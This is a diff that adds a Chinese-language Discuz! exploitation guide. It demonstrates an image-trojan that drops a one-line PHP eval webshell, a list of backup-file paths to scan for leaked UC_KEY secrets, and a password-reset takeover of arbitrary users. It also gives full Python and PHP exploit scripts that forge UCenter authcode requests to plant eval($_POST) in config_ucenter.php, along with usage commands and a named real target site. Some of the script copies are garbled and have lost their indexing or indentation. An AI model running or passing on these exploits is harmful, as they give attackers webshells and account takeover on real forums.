@@ -84,3 +84,704 @@ EXP
 include/discuzcode.func.php
 
 Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui? GLOBALS[_DCACHE][smilies][replacearray]=phpinfo()?
+
+
+
+其他
+下面我演示直接拿shell
+
+首先上传一张图片马到论坛
+
+/data/attachment/forum/201511/07//174818npewlpqlzaepi9dw.jpg
+
+图片木马制作：copy 1.jpg/b+1.txt/a 2.jpg
+
+txt内容
+<?php fputs(fopen('f.php','w'),'<?php eval($_POST[f])?>');?>
+在当前目录下生成一句话f.php
+应用管理 添加应用
+
+
+
+添加应用
+
+
+
+填好了内容之后，访问应用连接
+
+http://newbbs.play.ifeng.com/uc_server/admin.php?m=app&a=ping&appid=【应用id】
+
+应用id在应用列表里有
+
+在uc_server目录下会生成f.php 密码f
+
+菜刀连接之
+下面讲利用uc_key拿shell
+通常可以通过扫描这些文件获取Discuz的UC_KEY
+
+/config/config_global.php.bak
+/uc_server/data/config.inc.php.bak
+/config/config_global.php.zip
+/config/config_global.php.rar
+/config/config_global.tar.gz
+/uc_server/data/config.inc.php.zip
+/wwwroot.zip
+/wwwroot.rar
+/www.rar
+/www.zip
+/web.rar
+/web.zip
+/webbak.zip
+
+UC_KEY在config/config_ucenter.php里面
+
+ 
+
+Discuz X1.5 X2.5 X3用uc_key来get webshell
+
+uc_key是UC客户端与服务端通信的通信密钥。因此使用uc_key来fetshell只能获取UCenter Client的webshell，即Discuiz！论坛的webshell。如果一个服务器上只有UCenter Server是不能通过uc_key来获取该服务器上的webshell的（不过可以通过uc_key来将服务器上的数据并重置用户口令，后面讲）。
+
+90分享的php版的exp代码，但uc_key和url是嵌入在代码中的，因此导致使用不方便。所以我将代码改成python版的，以后使用就方便了。代码如下：
+import hashlib
+import time
+import math
+import base64
+import urllib
+import urllib2
+import sys
+
+
+def microtime(get_as_float = False) :
+    if get_as_float:
+        return time.time()
+    else:
+        return '%.8f %d' % math.modf(time.time())
+
+def get_authcode(string, key = ''):
+    ckey_length = 4
+    key = hashlib.md5(key).hexdigest()
+    keya = hashlib.md5(key[0:16]).hexdigest()
+    keyb = hashlib.md5(key[16:32]).hexdigest()
+    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]
+    #keyc = (hashlib.md5('0.736000 1389448306').hexdigest())[-ckey_length:]
+    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()
+    
+    key_length = len(cryptkey)
+    string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string
+    string_length = len(string)
+    result = ''
+    box = range(0, 256)
+    rndkey = dict()
+    for i in range(0,256):
+        rndkey = ord(cryptkey[i % key_length])
+    j=0
+    for i in range(0,256):
+        j = (j + box + rndkey) % 256
+        tmp = box
+        box = box[j]
+        box[j] = tmp
+    a=0
+    j=0
+    for i in range(0,string_length):
+        a = (a + 1) % 256
+        j = (j + box[a]) % 256
+        tmp = box[a]
+        box[a] = box[j]
+        box[j] = tmp
+        result += chr(ord(string) ^ (box[(box[a] + box[j]) % 256]))
+    return keyc + base64.b64encode(result).replace('=', '')
+
+def get_shell(url,key,host):
+    '''
+    发送命令获取webshell
+    '''
+    headers={'Accept-Language':'zh-cn',
+    'Content-Type':'application/x-www-form-urlencoded',
+    'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
+    'Referer':url
+    }
+    tm = time.time()+10*3600
+    tm="time=%d&action=updateapps" %tm
+    code = urllib.quote(get_authcode(tm,key))
+    url=url+"?code="+code
+    data1='''<?xml version="1.0" encoding="ISO-8859-1"?>
+            <root>
+            <item id="UC_API">http://xxx\');eval($_POST[1]);//</item>
+            </root>'''
+    try:
+        req=urllib2.Request(url,data=data1,headers=headers)
+        ret=urllib2.urlopen(req)
+    except:
+        return "访问出错"
+    data2='''<?xml version="1.0" encoding="ISO-8859-1"?>
+            <root>
+            <item id="UC_API">http://aaa</item>
+            </root>'''
+    try:
+        req=urllib2.Request(url,data=data2,headers=headers)
+        ret=urllib2.urlopen(req)
+    except:
+        return "error"
+    return "webshell:"+host+"/config/config_ucenter.php,password:1"
+    
+if __name__ == '__main__':
+    host=sys.argv[1]
+    key=sys.argv[2]
+    url=host+"/api/uc.php"
+    print get_shell(url,key,host)
+即第一个参数是网站的根路径，第二个参数是uc_key。获取的webshell是在/config/config_ucenter.php中
+ps:代码仓促编写，有什么问题请指出。本来打算通过py2exe来将其生成为exe，担心大家怕有后门不敢用，各位大牛就自己生成一下吧。经过测试在discuiz x2.5 x3 x3.1 下都测试成功。
+ps:uc_key可以在discuiz后台中看，或者是通过泄露的配置文件中获取。访问discuiz目录下的admin.php登陆后台，在"站长"—>"UCenter 设置"中来查看uc_key.
+二、使用UC_KEY可重置论坛（除uid为1的）任意用户的密码
+通过获取到的UC_KEY，即可重置论坛任意用户的密码，并清除安全提问。注意本重置任意用户密码的方法并不适用于uid为1的用户（即管理员），因为上会将本地的管理员用户覆盖，从而登陆不进去本地搭建的dz后台(重置管理员uid为1的方法后面讲)
+测试环境：
+目标站点：http://192.168.32.101/dz/。管理员jinglingshu，建了两个用户test1和test2。uc_key为B4s07bE2n5nef8e2M2F0a3Y8k7G6IeEb70G2Kf1cD0VfO0b1D8pcu6p773E487D9
+目标：重置test1的用户口令。
+
+
+可以看到test1用户的uid为2，重置密码的过程如下：
+1、本地搭建dz。在"站长"—>"UCenter设置"中修改UCenter设置，然后保存。一定要选择接口方式，且 是否允许其他应用的会员在站点激活、是否允许直接激活 两项配置开启
+
+
+2、点击"工具"–>"更新缓存"来更新缓存。然后，在"用户"–>"添加用户"中添加要重置的用户
+
+
+
+
+
+ps:系统提示用户已经存在，是否在本地激活，选择 是
+3、查看本地添加的用户信息，并修改密码和清除安全提问。
+
+4、现在test1的用户的密码被修改为123456，并清除了安全提问。使用test1和123456登陆远程站点
+ 
+
+利用UC_KEY也可以Getshell
+
+<?php 
+
+// 代码版权归原作者所有！
+
+    $timestamp = time()+10*3600;
+
+    $host="www.xx.com";
+
+    $uc_key="5ce0C6kc35i5cfD2D5n6S697C1cdlbM1N8YcddM7u1Abis5F2s3MdM9qc2278L8R4e6";
+
+    $code=urlencode(_authcode("time=$timestamp&#038;action=updateapps", 'ENCODE', $uc_key));
+
+    $cmd1='<?xml version="1.0" encoding="ISO-8859-1"?-->
+
+http://xxx\');eval($_POST[xss]);//
+
+';
+
+    $cmd2='<!--?xml version="1.0" encoding="ISO-8859-1"?-->
+
+http://aaa
+
+';
+
+    $html1 = send($cmd1);
+
+    echo $html1;
+
+    $html2 = send($cmd2);
+
+    echo $html2;
+
+function send($cmd){
+
+    global $host,$code;
+
+    $message = "POST /api/uc.php?code=".$code."  HTTP/1.1\r\n";
+
+    $message .= "Accept: */*\r\n";
+
+    $message .= "Referer: ".$host."\r\n";
+
+    $message .= "Accept-Language: zh-cn\r\n";
+
+    $message .= "Content-Type: application/x-www-form-urlencoded\r\n";
+
+    $message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";
+
+    $message .= "Host: ".$host."\r\n";
+
+    $message .= "Content-Length: ".strlen($cmd)."\r\n";
+
+    $message .= "Connection: Close\r\n\r\n";
+
+    $message .= $cmd;
+
+    //var_dump($message);
+
+    $fp = fsockopen($host, 80);
+
+    fputs($fp, $message);
+
+    $resp = '';
+
+    while ($fp &amp;&amp; !feof($fp))
+
+        $resp .= fread($fp, 1024);
+
+    return $resp;
+
+}
+
+function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
+
+    $ckey_length = 4;
+
+    $key = md5($key ? $key : UC_KEY);
+
+    $keya = md5(substr($key, 0, 16));
+
+    $keyb = md5(substr($key, 16, 16));
+
+    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
+
+    $cryptkey = $keya.md5($keya.$keyc);
+
+    $key_length = strlen($cryptkey);
+
+    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+
+    $string_length = strlen($string);
+
+    $result = '';
+
+    $box = range(0, 255);
+
+    $rndkey = array();
+
+    for($i = 0; $i &lt;= 255; $i++) {
+
+        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
+
+    }
+
+    for($j = $i = 0; $i &lt; 256; $i++) {
+
+        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
+
+        $tmp = $box[$i];
+
+        $box[$i] = $box[$j];
+
+        $box[$j] = $tmp;
+
+    }
+
+    for($a = $j = $i = 0; $i &lt; $string_length; $i++) {
+
+        $a = ($a + 1) % 256;
+
+        $j = ($j + $box[$a]) % 256;
+
+        $tmp = $box[$a];
+
+        $box[$a] = $box[$j];
+
+        $box[$j] = $tmp;
+
+        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+
+    }
+
+    if($operation == 'DECODE') {
+
+        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
+
+            return substr($result, 26);
+
+        } else {
+
+                return '';
+
+            }
+
+    } else {
+
+        return $keyc.str_replace('=', '', base64_encode($result));
+
+    }
+
+}
+
+echo "webshell: http://".$host."/config/config_ucenter.php pass:xss"
+
+?>
+
+如果以上的exp还是不管用 请用以下的exp Discuz X1.5 X2.5 X3 uc_key getshell
+ 
+
+提供两个版本
+
+PHP版
+
+<?php
+
+// 代码版权归原作者所有！
+
+$timestamp = time()+10*3600;
+
+$host="127.0.0.1";
+
+$uc_key="eapf15K8b334Bc8eBeY4Gfn1VbqeA0N5Waofq6J285Ca33i151e551g0l9f2l3dd";
+
+$code=urlencode(_authcode("time=$timestamp&action=updateapps", 'ENCODE', $uc_key));
+
+$cmd1='<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<root>
+
+<item id="UC_API">http://xxx\');eval($_POST[DOM]);//</item>
+
+</root>';
+
+$cmd2='<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<root>
+
+<item id="UC_API">http://aaa</item>
+
+</root>';
+
+$html1 = send($cmd1);
+
+echo $html1;
+
+$html2 = send($cmd2);
+
+echo $html2;
+
+ 
+
+function send($cmd){
+
+global $host,$code;
+
+$message = "POST /api/uc.php?code=".$code." HTTP/1.1\r\n";
+
+$message .= "Accept: */*\r\n";
+
+$message .= "Referer: ".$host."\r\n";
+
+$message .= "Accept-Language: zh-cn\r\n";
+
+$message .= "Content-Type: application/x-www-form-urlencoded\r\n";
+
+$message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";
+
+$message .= "Host: ".$host."\r\n";
+
+$message .= "Content-Length: ".strlen($cmd)."\r\n";
+
+$message .= "Connection: Close\r\n\r\n";
+
+$message .= $cmd;
+
+ 
+
+    //var_dump($message);
+
+$fp = fsockopen($host, 80);
+
+fputs($fp, $message);
+
+ 
+
+$resp = '';
+
+ 
+
+while ($fp && !feof($fp))
+
+$resp .= fread($fp, 1024);
+
+ 
+
+return $resp;
+
+}
+
+ 
+
+function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
+
+$ckey_length = 4;
+
+ 
+
+$key = md5($key ? $key : UC_KEY);
+
+$keya = md5(substr($key, 0, 16));
+
+$keyb = md5(substr($key, 16, 16));
+
+$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
+
+ 
+
+$cryptkey = $keya.md5($keya.$keyc);
+
+$key_length = strlen($cryptkey);
+
+ 
+
+$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+
+$string_length = strlen($string);
+
+ 
+
+$result = '';
+
+$box = range(0, 255);
+
+ 
+
+$rndkey = array();
+
+for($i = 0; $i <= 255; $i++) {
+
+$rndkey[$i] = ord($cryptkey[$i % $key_length]);
+
+}
+
+ 
+
+for($j = $i = 0; $i < 256; $i++) {
+
+$j = ($j + $box[$i] + $rndkey[$i]) % 256;
+
+$tmp = $box[$i];
+
+$box[$i] = $box[$j];
+
+$box[$j] = $tmp;
+
+}
+
+ 
+
+for($a = $j = $i = 0; $i < $string_length; $i++) {
+
+$a = ($a + 1) % 256;
+
+$j = ($j + $box[$a]) % 256;
+
+$tmp = $box[$a];
+
+$box[$a] = $box[$j];
+
+$box[$j] = $tmp;
+
+$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+
+}
+
+ 
+
+if($operation == 'DECODE') {
+
+if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
+
+return substr($result, 26);
+
+} else {
+
+return '';
+
+}
+
+} else {
+
+return $keyc.str_replace('=', '', base64_encode($result));
+
+}
+
+}
+
+?>
+
+Python版
+
+import hashlib
+
+import time
+
+import math
+
+import base64
+
+import urllib
+
+import urllib2
+
+import sys
+
+ 
+
+def microtime(get_as_float = False) :
+
+if get_as_float:
+
+return time.time()
+
+else:
+
+return '%.8f %d' % math.modf(time.time())
+
+ 
+
+def get_authcode(string, key = ''):
+
+ckey_length = 4
+
+key = hashlib.md5(key).hexdigest()
+
+keya = hashlib.md5(key[0:16]).hexdigest()
+
+keyb = hashlib.md5(key[16:32]).hexdigest()
+
+keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]
+
+#keyc = (hashlib.md5('0.736000 1389448306').hexdigest())[-ckey_length:]
+
+cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()
+
+ 
+
+key_length = len(cryptkey)
+
+string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string
+
+string_length = len(string)
+
+result = ''
+
+box = range(0, 256)
+
+rndkey = dict()
+
+for i in range(0,256):
+
+rndkey[i] = ord(cryptkey[i % key_length])
+
+j=0
+
+for i in range(0,256):
+
+j = (j + box[i] + rndkey[i]) % 256
+
+tmp = box[i]
+
+box[i] = box[j]
+
+box[j] = tmp
+
+a=0
+
+j=0
+
+for i in range(0,string_length):
+
+a = (a + 1) % 256
+
+j = (j + box[a]) % 256
+
+tmp = box[a]
+
+box[a] = box[j]
+
+box[j] = tmp
+
+result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))
+
+return keyc + base64.b64encode(result).replace('=', '')
+
+ 
+
+def get_shell(url,key,host):
+
+'''
+
+发送命令获取webshell
+
+'''
+
+headers={'Accept-Language':'zh-cn',
+
+'Content-Type':'application/x-www-form-urlencoded',
+
+'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
+
+'Referer':url
+
+}
+
+tm = time.time()+10*3600
+
+tm="time=%d&action=updateapps" %tm
+
+code = urllib.quote(get_authcode(tm,key))
+
+url=url+"?code="+code
+
+data1='''<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<root>
+
+<item id="UC_API">http://xxx\');eval($_POST[1]);//</item>
+
+</root>'''
+
+try:
+
+req=urllib2.Request(url,data=data1,headers=headers)
+
+ret=urllib2.urlopen(req)
+
+except:
+
+return "访问出错"
+
+data2='''<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<root>
+
+<item id="UC_API">http://aaa</item>
+
+</root>'''
+
+try:
+
+req=urllib2.Request(url,data=data2,headers=headers)
+
+ret=urllib2.urlopen(req)
+
+except:
+
+return "error"
+
+return "webshell:"+host+"/config/config_ucenter.php,password:1"
+
+ 
+
+if __name__ == '__main__':
+
+host=sys.argv[1]
+
+key=sys.argv[2]
+
+url=host+"/api/uc.php"
+
+print get_shell(url,key,host)
+
+使用方法：
+
+python uckey.py http://www.waitalone.cn/ uckey
+
+即第一个参数是网站的根路径，第二个参数是uc_key。获取的webshell是在/config/config_ucenter.php中的。
